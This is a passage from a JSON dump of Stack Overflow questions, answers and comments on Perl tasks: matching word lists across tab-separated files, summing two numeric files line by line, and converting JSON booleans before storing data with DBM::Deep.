=&gt; 'N',   \n    'input 3.txt' =&gt; 'P',   \n);\n\nwhile ( my ( $file, $pos ) = each %files ) {\n    open my $fh, '&lt;', $file;\n\n    while ( &lt;$fh&gt; ) {\n        s/\\s+\\z//;\n        $words{$_} = $pos;\n    }\n}\n\n{\n    open my $fh, '&lt;','input 1.txt';\n\n    while ( &lt;$fh&gt; ) {\n        next unless /\\S/;\n        my ($word) = split;\n        my $pos = $words{$word};\n        s/\\s+\\z/   $pos\\n/ if $pos;\n    }\n    continue {\n        print;\n    }\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>John    N   N\ngoes    V\nto      P   P\nschool  N\n.       S\nMary    N   N\ncomes   V\nfrom    P   P\nhome    N\n.       S\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 4090045, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/221389e356f56892a00164f051b81590?s=128&d=identicon&r=PG&f=1", "display_name": "Nandini143", "link": "https://stackoverflow.com/users/4090045/nandini143"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 166, "favorite_count": 1, "accepted_answer_id": 37974787, "answer_count": 3, "score": 3, "last_activity_date": 1467554530, "creation_date": 1466615754, "question_id": 37974486, "link": "https://stackoverflow.com/questions/37974486/separating-an-output-with-a-tab-space-perl", "title": "Separating an Output with a Tab / Space : Perl", "body": "<p>I am working with three text documents . The first one is the main input (Input 1) with words and the word type (Noun , Verb etc.)  separated by a tab.</p>\n\n<p>Input 1</p>\n\n<pre><code>John    N\ngoes    V\nto      P\nschool  N\n.       S\nMary    N\ncomes   V\nfrom    P\nhome    N\n.       S\n</code></pre>\n\n<p>The second and third input text files look like this  :</p>\n\n<p>Input 2</p>\n\n<pre><code>John\nMary\n</code></pre>\n\n<p>Input 3</p>\n\n<pre><code>to\nfrom\n</code></pre>\n\n<p>My objective is to compare and match the second and third text files with the main input and get a output like this :</p>\n\n<p>Expected output:</p>\n\n<pre><code>John    N   N\ngoes    V\nto      P   P\nschool  N\n.       S\nMary    N   N\ncomes   V\nfrom    P   P\nhome    N\n.       S\n</code></pre>\n\n<p>So, basically, all the three columns should be separated by tab or space. However, I am getting an output like this :</p>\n\n<pre><code>John N  \nN\ngoes    \nV\nto P    \nP\nschool  \nN\n.   \nS\nMary N  \nN\ncomes   \nV\nfrom P  \nP\nhome    \nN\n.   \nS\n</code></pre>\n\n<p>I believe this is happening as I took the input of the first text file into an array and printed the values.Please suggest me a way to get the desired output. \nThe program coding that I have used is below :</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\nuse strict;\n\nmy @file = ('Input 1.txt');\n\nopen my $word_fh, '&lt;', 'Input 2.txt' or die $!;\nopen my $word2_fh, '&lt;', 'Input 3.txt' or die $!;\n\nmy %words_to_match = map {chomp $_; $_ =&gt; 0} &lt;$word_fh&gt;;\nmy %words_to_match2 = map {chomp $_; $_ =&gt; 0} &lt;$word2_fh&gt;;\n\nclose $word_fh;\nclose $word2_fh;\n\ncheck($_) for @file;\n\nsub check {\n    my $file = shift;\n\nopen my $fh, '&lt;', $file or die $!;\n\nwhile (&lt;$fh&gt;){\n    chomp;\n    my @words_in_line = split;\n\n    for my $word (@words_in_line){\n        $word =~ s/[(\\.,;:!)]//g;\n        $word .= '  N' if exists $words_to_match{$word};\n        $word .= '  P' if exists $words_to_match2{$word};\n\n        print \"$word\\n\";\n    }\n    print \"\\n\";\n}\n</code></pre>\n\n<p>Again ,the objective is to have an output with all the three columns separated by tab or space. Any hints or suggestions is appreciated. Thanks in advance.</p>\n"}, {"tags": ["perl", "file"], "answers": [{"tags": [], "owner": {"reputation": 27293, "user_id": 5740031, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Una92.jpg?s=128&g=1", "display_name": "CodeFuller", "link": "https://stackoverflow.com/users/5740031/codefuller"}, "is_accepted": true, "score": 2, "last_activity_date": 1466659522, "last_edit_date": 1466659522, "creation_date": 1466613652, "answer_id": 37973882, "question_id": 37973556, "link": "https://stackoverflow.com/questions/37973556/perl-adding-2-files-line-by-line/37973882#37973882", "title": "Perl : Adding 2 files line by line", "body": "<p>You have two different problems with your script now:</p>\n\n<ol>\n<li><p>First error </p>\n\n<blockquote>\n  <p>Argument \"M-oM-;M-?3\" isn't numeric in addition (+) at perl_ii.pl line\n  30</p>\n</blockquote>\n\n<p>happens because your input files are saved in Unicode and first line is read with \"\\xFF\\xFE\" BOM bytes.\nTo fix it simply, just resave the files as ANSI text. If Unicode is required, then remove these bytes from first string you read from file.</p></li>\n<li><p>Second error </p>\n\n<blockquote>\n  <p>Use of uninitialized value in addition (+) at perl_ii.pl line 30.</p>\n</blockquote>\n\n<p>happens because you access 4th element in first array that doesn't exist. Remember, you select maximal input array length as index limit. To fix it just add following condition for input element:</p>\n\n<pre><code>$asum[@asum] = (@asum &lt; @array1 ? $array1[@asum] : 0)  + (@asum &lt; @array2 ? $array2[@asum] : 0) while defined $array1[@asum] or defined $array2[@asum];\n</code></pre></li>\n</ol>\n"}, {"comments": [{"owner": {"reputation": 183, "user_id": 5904495, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a89b3b68905b01d2eb4cd93d2131e036?s=128&d=identicon&r=PG&f=1", "display_name": "user324", "link": "https://stackoverflow.com/users/5904495/user324"}, "edited": false, "score": 0, "creation_date": 1466655620, "post_id": 37974448, "comment_id": 63409637, "body": "Thanks! But I was looking for a solution specifically in Perl. :)"}], "tags": [], "owner": {"reputation": 32690, "user_id": 3266847, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/U0oyt.png?s=128&g=1", "display_name": "Benjamin W.", "link": "https://stackoverflow.com/users/3266847/benjamin-w"}, "is_accepted": false, "score": 1, "last_activity_date": 1466615598, "creation_date": 1466615598, "answer_id": 37974448, "question_id": 37973556, "link": "https://stackoverflow.com/questions/37973556/perl-adding-2-files-line-by-line/37974448#37974448", "title": "Perl : Adding 2 files line by line", "body": "<p>A different approach altogether:</p>\n\n<pre><code>$ paste -d '+' file1 file2 | sed 's/^+//;s/+$//' | bc\n3\n6\n8\n6\n</code></pre>\n\n<p>The <code>paste</code> command prints the files next to each other, separated by a <code>+</code> sign:</p>\n\n<pre><code>$ paste -d '+' file1 file2\n1+2\n2+4\n3+5\n+6\n</code></pre>\n\n<p>The sed command removes leading and trailing <code>+</code> signs, because those trip up <code>bc</code>:</p>\n\n<pre><code>$ paste -d '+' file1 file2 | sed 's/^+//;s/+$//'\n1+2\n2+4\n3+5\n6\n</code></pre>\n\n<p>And <code>bc</code> finally calculates the sums.</p>\n"}, {"comments": [{"owner": {"reputation": 183, "user_id": 5904495, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a89b3b68905b01d2eb4cd93d2131e036?s=128&d=identicon&r=PG&f=1", "display_name": "user324", "link": "https://stackoverflow.com/users/5904495/user324"}, "edited": false, "score": 0, "creation_date": 1466655594, "post_id": 37976407, "comment_id": 63409628, "body": "Thanks for the help!"}], "tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 2, "last_activity_date": 1466622576, "last_edit_date": 1495535329, "creation_date": 1466622576, "answer_id": 37976407, "question_id": 37973556, "link": "https://stackoverflow.com/questions/37973556/perl-adding-2-files-line-by-line/37976407#37976407", "title": "Perl : Adding 2 files line by line", "body": "<p>The logic of reading your two files is the same, and I suggest using a subroutine for that and calling it twice:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nmy @array1 = read_into_array('file1.txt');\nmy @array2 = read_into_array('file2.txt');\n\nsub read_into_array\n{\n    my $filename = shift;\n    my @array;\n    open(my $fh, \"&lt;\", $filename) or die \"Failed to open $filename: $!\\n\";\n    while(&lt;$fh&gt;) { \n        chomp; \n        push @array, $_;\n    } \n    close $fh;\n    return @array;\n}\n</code></pre>\n\n<p>But that's just an observation I made and not a solution to your problem. As <a href=\"https://stackoverflow.com/a/37973882/5830574\">CodeFuller already said</a>, you should re-save your files as plain ASCII instead of UTF-8.</p>\n\n<p>The second problem, <em>Use of uninitialized value in addition (+)</em>, can also be solved with the <a href=\"http://perldoc.perl.org/perlop.html#Logical-Defined-Or\" rel=\"nofollow noreferrer\">Logical Defined Or</a> operator <code>//</code> which was introduced in Perl 5.10:</p>\n\n<pre><code>my @asum;\n$asum[@asum] = ($array1[@asum] // 0) \n             + ($array2[@asum] // 0) \n             while defined $array1[@asum] or defined $array2[@asum];\n</code></pre>\n\n<p>No, this is not a comment, but an operator very similar to <code>||</code>. The difference is that it triggers when the left-hand-side (lhs) is <code>undef</code> while the <code>||</code> triggers when the lhs is <em>falsy</em> (i.e. <code>0</code>, <code>''</code> or <code>undef</code>). Thus</p>\n\n<pre><code>$array1[@asum] // 0\n</code></pre>\n\n<p>gives <code>0</code> if <code>$array1[@asum]</code> is undef. It's the same as</p>\n\n<pre><code>defined($array1[@asum]) ? $array1[@asum] : 0\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 183, "user_id": 5904495, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a89b3b68905b01d2eb4cd93d2131e036?s=128&d=identicon&r=PG&f=1", "display_name": "user324", "link": "https://stackoverflow.com/users/5904495/user324"}, "edited": false, "score": 0, "creation_date": 1466655849, "post_id": 37977550, "comment_id": 63409695, "body": "Thanks a lot! Seems like a shorter solution to my problem :)"}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1467304517, "post_id": 37977550, "comment_id": 63688860, "body": "This is an improvement over holding all files in memory, but its memory footprint is still determined by the size of the largest file. See <a href=\"https://www.nu42.com/2016/06/sum-multiple-files-using-perl.html\" rel=\"nofollow noreferrer\">How to sum data from multiple files in Perl?</a>."}], "tags": [], "owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "is_accepted": false, "score": 3, "last_activity_date": 1466739968, "last_edit_date": 1466739968, "creation_date": 1466626857, "answer_id": 37977550, "question_id": 37973556, "link": "https://stackoverflow.com/questions/37973556/perl-adding-2-files-line-by-line/37977550#37977550", "title": "Perl : Adding 2 files line by line", "body": "<p>Here is another Perl solution that makes use of the diamond, <code>&lt;&gt;</code>, file read operator. This reads in files specified on the command line, (rather than explicitly opening them within the program). Sorry, I can't find the part of the docs that explains this for a read.</p>\n\n<p>The command line for this program would look like:</p>\n\n<p><code>perl myprogram.pl file1 file2 &gt; outputfile</code></p>\n\n<p>Where file1 and file2 are the 2 input files and outputfile is the file you want to print the results of the addition.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nmy @sums;\nmy $i = 0;\nwhile (my $num = &lt;&gt;) {\n    $sums[$i++] += $num;\n    $i = 0 if eof;\n}\n\nprint \"$_\\n\" for @sums;\n</code></pre>\n\n<p>Note: <code>$i</code> is reset to zero at the end of file, (in this case after the first file is read). Actually, it is also reset to 0 after the second file is read. This has no effect on the program however, because there are no files to be read after the second file in your example.</p>\n"}, {"comments": [{"owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "edited": false, "score": 0, "creation_date": 1467319303, "post_id": 38128872, "comment_id": 63696958, "body": "Thanks, Sinan. I have added your program to my saved programs. I have seen other problems that needed to read 2 or more files one line each at a time and then process them. I hadn&#39;t thought about the possible memory problem when I offered my solution here. Just wondering - why did you use croak from the Carp module instead of die. Is it usual to use Carp when building a module and you want to use croak then? I&#39;ve never been too informed about when to use Carp instead of dying. I see you edited your <code>make_reader</code> sub - guess it does the same as the original definition."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "reply_to_user": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "edited": false, "score": 0, "creation_date": 1467321140, "post_id": 38128872, "comment_id": 63697841, "body": "The main benefit of <code>croak</code> is that you can force a <a href=\"https://metacpan.org/pod/Carp#Forcing-a-Stack-Trace\" rel=\"nofollow noreferrer\">stack dump</a> without changing the script. I edited my answer to avoid the <code>if&#47;else</code>. I think a linear flows read much better. I have written countless variations of this, some with logging, better error recovery, formatting etc, but I tried to avoid all of that to distill everything to its essence here."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 2, "creation_date": 1467337707, "post_id": 38128872, "comment_id": 63702577, "body": "Wow, this is a treasure-trove.  Great use of closure, rare to see it in real life. Thank you."}, {"owner": {"reputation": 538, "user_id": 490240, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c64a9d5c93890e5043388e0f8508fc5?s=128&d=identicon&r=PG", "display_name": "jrw32982", "link": "https://stackoverflow.com/users/490240/jrw32982"}, "edited": false, "score": 0, "creation_date": 1467645460, "post_id": 38128872, "comment_id": 63801442, "body": "@Sinan&#220;n&#252;r You mentioned other versions of your code with better error recovery (and I assume error handling).  I find it inconsistent that you check for errors on <code>close</code>, but not on <code>&lt;&gt;</code>.  I can&#39;t tell about checking for errors on <code>open</code> since it depends on the error handling of <code>path</code> and <code>readr</code>.  Would you consider modifying your answer to either ignore the <code>close</code> errors or, preferably add error handling for <code>&lt;&gt;</code>?"}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "reply_to_user": {"reputation": 538, "user_id": 490240, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c64a9d5c93890e5043388e0f8508fc5?s=128&d=identicon&r=PG", "display_name": "jrw32982", "link": "https://stackoverflow.com/users/490240/jrw32982"}, "edited": false, "score": 0, "creation_date": 1467664672, "post_id": 38128872, "comment_id": 63809327, "body": "@JohnWiersba The kind of error handling I am referring to is about checking that the input conforms to a spec. A quick glance at <a href=\"https://metacpan.org/pod/Path::Tiny\" rel=\"nofollow noreferrer\">Path::Tiny</a> will show, <code>openr</code> croaks on failure. As for errors from <code>readline</code>, see <code>perldoc -f readline</code>: &quot;It can be helpful to check <code>$!</code> when you are reading from filehandles you don&#39;t trust, such as a tty or a socket&quot;. In normal circumstances, checking for errors in <code>readline</code> is rather superfluous. In this case, if <code>readline</code> returns <code>undef</code>, we immediately try to <code>close</code> the file. If something went wrong, that&#39;ll tell us."}, {"owner": {"reputation": 538, "user_id": 490240, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c64a9d5c93890e5043388e0f8508fc5?s=128&d=identicon&r=PG", "display_name": "jrw32982", "link": "https://stackoverflow.com/users/490240/jrw32982"}, "edited": false, "score": 0, "creation_date": 1467677843, "post_id": 38128872, "comment_id": 63812520, "body": "@Sinan&#220;n&#252;r Are you saying that a read error (e.g. CD ejected while reading a large file from a CD) will return undef from <code>readline</code> and then <b>also return an error from <code>close</code></b>?  If so, is that documented somewhere?  That would be handy because I don&#39;t trust <code>readline</code> much when it comes to error handling."}], "tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": false, "score": 3, "last_activity_date": 1467341600, "last_edit_date": 1467341600, "creation_date": 1467304597, "answer_id": 38128872, "question_id": 37973556, "link": "https://stackoverflow.com/questions/37973556/perl-adding-2-files-line-by-line/38128872#38128872", "title": "Perl : Adding 2 files line by line", "body": "<p>The following solution makes the memory footprint of the program independent of the sizes of the files. Instead, now the memory footprint only depends on the <em>number</em> of files:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nuse Carp qw( croak );\nuse List::Util qw( sum );\nuse Path::Tiny;\n\nrun(@ARGV);\n\nsub run {\n    my @readers = map make_reader($_), @_;\n\n    while (my @obs = grep defined, map $_-&gt;(), @readers) {\n        print sum(@obs), \"\\n\";\n    }\n\n    return;\n}\n\nsub make_reader {\n    my $fname = shift;\n    my $fhandle = path( $fname )-&gt;openr;\n    my $is_readable = 1;\n    sub {\n        return unless $is_readable;\n\n        my $line = &lt;$fhandle&gt;;\n        return $line if defined $line;\n\n        close $fhandle\n            or croak \"Cannot close '$fname': $!\";\n\n        $is_readable = 0;\n        return;\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 100624, "user_id": 9410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e17949267bbfe21a0fadf1bbf00592b4?s=128&d=identicon&r=PG", "display_name": "Aristotle Pagaltzis", "link": "https://stackoverflow.com/users/9410/aristotle-pagaltzis"}, "is_accepted": false, "score": 1, "last_activity_date": 1467474848, "creation_date": 1467474848, "answer_id": 38161895, "question_id": 37973556, "link": "https://stackoverflow.com/questions/37973556/perl-adding-2-files-line-by-line/38161895#38161895", "title": "Perl : Adding 2 files line by line", "body": "<p>Here\u2019s a rendition of <a href=\"https://stackoverflow.com/a/38128872/9410\">Sinan\u2019s approach</a> in a more Perlish form:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse 5.010; use strict; use warnings;\n\nuse autodie;\nuse List::Util 'sum';\n\nmy @fh = map { open my $fh, '&lt;', $_; $fh } @ARGV;\n\nwhile ( my @value = grep { defined } map { scalar readline $_ } @fh ) {\n    say sum @value;\n    @fh = grep { not eof $_ } @fh if @value &lt; @fh;\n}\n</code></pre>\n"}], "owner": {"reputation": 183, "user_id": 5904495, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a89b3b68905b01d2eb4cd93d2131e036?s=128&d=identicon&r=PG&f=1", "display_name": "user324", "link": "https://stackoverflow.com/users/5904495/user324"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 309, "favorite_count": 0, "accepted_answer_id": 37973882, "answer_count": 6, "score": 1, "last_activity_date": 1467474848, "creation_date": 1466612606, "last_edit_date": 1466655224, "question_id": 37973556, "link": "https://stackoverflow.com/questions/37973556/perl-adding-2-files-line-by-line", "title": "Perl : Adding 2 files line by line", "body": "<p>I am a beginner in perl, so please bear with me.</p>\n\n<p>I have 2 files:</p>\n\n<pre><code>1\n2\n3\n</code></pre>\n\n<p>and</p>\n\n<pre><code>2\n4\n5\n6\n</code></pre>\n\n<p>I want to create a new file that is the sum of the above 2 files:</p>\n\n<p>output file:</p>\n\n<pre><code>3\n6\n8\n6\n</code></pre>\n\n<p>What I am doing right now is reading the files as arrays and adding them element by element.</p>\n\n<p>To add the arrays I am using the following:</p>\n\n<pre><code>$asum[@asum] = $array1[@asum] + $array2[@asum] while defined $array1[@asum] or defined $array2[@asum];\n</code></pre>\n\n<p>But this is giving the following error:</p>\n\n<pre><code>Argument \"M-oM-;M-?3\" isn't numeric in addition (+) at perl_ii.pl line 30.\nArgument \"M-oM-;M-?1\" isn't numeric in addition (+) at perl_ii.pl line 30.\nUse of uninitialized value in addition (+) at perl_ii.pl line 30.\n</code></pre>\n\n<p>I am using the following code to read files as arrays:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy @array1;\nopen(my $fh, \"&lt;\", \"file1.txt\") or die \"Failed to open file1\\n\";\nwhile(&lt;$fh&gt;) { \n    chomp; \n    push @array1, $_;\n} \nclose $fh;\n\nmy @array2;\nopen(my $fh1, \"&lt;\", \"file2.txt\") or die \"Failed to open file2\\n\";\nwhile(&lt;$fh1&gt;) {\n    chomp;\n    push @array2, $_;\n}\nclose $fh1 ;\n</code></pre>\n\n<p>Anyone could tell me how to fix this, or give a better approach altogether?</p>\n"}, {"tags": ["json", "perl", "hash", "decode", "dbm"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1466613354, "post_id": 37973342, "comment_id": 63393683, "body": "Out of curiosity, why not just store the raw JSON instead of using DBM::Deep?"}, {"owner": {"reputation": 801, "user_id": 3264448, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/1EyDR.jpg?s=128&g=1", "display_name": "CodeQuestor", "link": "https://stackoverflow.com/users/3264448/codequestor"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466616746, "post_id": 37973342, "comment_id": 63395700, "body": "My requirement is to store the json structure(upto 4-5 level deep) in some in-memory database, so that i can access them after storing."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466617723, "post_id": 37973342, "comment_id": 63396300, "body": "By default, DBM::Deep stores data in a file, not an in-memory database. Can you explain your requirements a little more clearly? I still don&#39;t understand why you don&#39;t just deserialize the raw JSON file every time you want to use it."}, {"owner": {"reputation": 801, "user_id": 3264448, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/1EyDR.jpg?s=128&g=1", "display_name": "CodeQuestor", "link": "https://stackoverflow.com/users/3264448/codequestor"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466617934, "post_id": 37973342, "comment_id": 63396424, "body": "My Bad : I want to store the data in persistent memory, which can be file also. Hence i chose to DBM::Deep."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466621390, "post_id": 37973342, "comment_id": 63398347, "body": "A JSON file <i>is</i> persistent."}, {"owner": {"reputation": 801, "user_id": 3264448, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/1EyDR.jpg?s=128&g=1", "display_name": "CodeQuestor", "link": "https://stackoverflow.com/users/3264448/codequestor"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466653177, "post_id": 37973342, "comment_id": 63408969, "body": "Yes, it is persistent."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466663146, "post_id": 37973342, "comment_id": 63412377, "body": "So why not just use the JSON file? DBM::Deep just adds unnecessary complexity."}, {"owner": {"reputation": 801, "user_id": 3264448, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/1EyDR.jpg?s=128&g=1", "display_name": "CodeQuestor", "link": "https://stackoverflow.com/users/3264448/codequestor"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466663717, "post_id": 37973342, "comment_id": 63412649, "body": "I want to map each JSON file content to some key, so that i can access the values as per my requirement."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466680787, "post_id": 37973342, "comment_id": 63423925, "body": "You can do that using a simple hash where the values are file names. If the mapping needs to be persistent, you can store it in a file e.g. in CSV format. My point is that JSON is already serialized data; it doesn&#39;t make a lot of sense to deserialize it and then serialize it again with DBM::Deep."}], "answers": [{"comments": [{"owner": {"reputation": 801, "user_id": 3264448, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/1EyDR.jpg?s=128&g=1", "display_name": "CodeQuestor", "link": "https://stackoverflow.com/users/3264448/codequestor"}, "edited": false, "score": 0, "creation_date": 1466616417, "post_id": 37973857, "comment_id": 63395502, "body": "Thanks for your response. But i am having deep JSON structure(upto 3-4 level) and having 1000+ json files to create the DBM deep hash, so parsing hash will be quite costly operation."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 801, "user_id": 3264448, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/1EyDR.jpg?s=128&g=1", "display_name": "CodeQuestor", "link": "https://stackoverflow.com/users/3264448/codequestor"}, "edited": false, "score": 0, "creation_date": 1466616931, "post_id": 37973857, "comment_id": 63395821, "body": "1. What&#39;s your point? 2. I don&#39;t see why you think this. It can&#39;t be more expensive than generating the structure in the first place. 3. The time it takes pales in comparison to the time DBM::Deep takes."}, {"owner": {"reputation": 801, "user_id": 3264448, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/1EyDR.jpg?s=128&g=1", "display_name": "CodeQuestor", "link": "https://stackoverflow.com/users/3264448/codequestor"}, "edited": false, "score": 0, "creation_date": 1466617296, "post_id": 37973857, "comment_id": 63396029, "body": "Yes, i agree with on 3rd point as i bench-marked the above code and it quite lesser than DBM::Deep operation. I had many JSON files and thought to perform above conversion(which is implemented as a recursion call) may take higher time, But now my doubt is clear. Thanks again!"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1466614029, "last_edit_date": 1466614029, "creation_date": 1466613564, "answer_id": 37973857, "question_id": 37973342, "link": "https://stackoverflow.com/questions/37973342/dbmdeep-is-failing-to-import-hashref-having-true-or-false-values/37973857#37973857", "title": "DBM::Deep is failing to import hashref having &#39;true&#39; or &#39;false&#39; values", "body": "<p>The JSON parser you are using, among others, returns an object that works as a boolean when it encounters <code>true</code> or <code>false</code> in the JSON. This allows the data to be re-encoded into JSON without change, but it can cause this kind of issue.</p>\n\n<p><code>null</code> doesn't have this problem because Perl has a native value (<code>undef</code>) that can be used to represent it unambiguously.</p>\n\n<p>The following convert these objects into simple values.</p>\n\n<pre><code> sub convert_json_bools {\n    local *_convert_json_bools = sub {\n        my $ref_type = ref($_[0])\n            or return;\n\n        if ($ref_type eq 'HASH') {\n            _convert_json_bools($_) for values(%{ $_[0] });\n        }\n        elsif ($ref_type eq 'ARRAY') {\n            _convert_json_bools($_) for @{ $_[0] };\n        }\n        elsif ($ref_type =~ /::Boolean\\z/) {\n            $_[0] = $_[0] ? 1 : 0;\n        }\n        else {\n            warn(\"Unsupported type $ref_type\\n\");\n        }\n    };\n\n    &amp;_convert_json_bools;\n}\n\nconvert_json_bools($data);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 21782, 